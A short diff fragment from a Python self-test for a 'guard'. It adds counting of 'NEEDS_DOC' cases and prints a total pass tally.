+                doc_cases.append(name)
+                if got != want:
+                    bad += 1
+                    print(f"FAIL  NEEDS_DOC {name}: want {want}, got {got}")
+    total = len(CASES) + len(PATH_CASES) + len(tool_cases) + len(doc_cases)
     print(f"guard self-test: {total - bad}/{total} cases pass")
     return 1 if bad else 0
 
